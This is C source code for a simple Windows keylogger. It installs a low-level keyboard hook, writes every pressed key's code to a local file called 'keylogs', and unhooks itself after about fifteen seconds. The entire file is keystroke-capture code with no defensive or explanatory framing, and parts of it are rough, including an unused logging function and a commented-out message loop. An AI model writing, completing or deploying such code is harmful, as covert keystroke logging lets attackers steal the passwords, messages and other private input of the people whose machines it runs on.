#include <stdio.h>
#include <time.h>
#include <windows.h>
#include <winuser.h>

FILE *outputFile;
HHOOK hKeyHook;
clock_t start;
clock_t duration;

void logA(char s1[]) {
  FILE *file = fopen("Filename", "a+");

  static int i = 0;
  fputs(s1, file);
  i++;
  if (i == 50) {
    fputc('\n', file);
    i = 0;
  }
  fclose(file);
}

void writeToFile(DWORD code) {
  char val[100];
  sprintf(val, "%c", code);

  fputs(val, outputFile);
}

LRESULT CALLBACK LowLevelKeyboardProc(int code, WPARAM messageIdentifier,
                                      LPARAM hookStruct) {
  // LowLevelKeyboardProc is called by the system on a new keyboard input event
  KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)hookStruct;

  if (messageIdentifier == WM_KEYDOWN) {
    DWORD vCode = pKeyBoard->vkCode;
    writeToFile(vCode);
  }

  duration = (clock() - start) / CLOCKS_PER_SEC;
  if (duration > 15) {
    UnhookWindowsHookEx(hKeyHook);
    fclose(outputFile);
    exit(0);
  }

  return CallNextHookEx(
      hKeyHook, code, messageIdentifier,
      hookStruct); // I think it just lets the original program continue running
}

HHOOK setHook() {

  return SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)LowLevelKeyboardProc,
                          GetModuleHandle(NULL), 0);
  /*
   MSG msg;

   while (GetMessage(&msg, NULL, 0, 0) != 0)
     msg = 0;

   UnhookWindowsHookEx(hKeyHook);
   */
}

void keyloggerMain() {
  start = clock();
  duration = (clock() - clock()) / CLOCKS_PER_SEC;
  MSG msg;
  outputFile = fopen("keylogs", "a+");

  hKeyHook = setHook();

  GetMessage(&msg, NULL, 0, 0);
}

int main() {
  keyloggerMain();
  return 0;
}
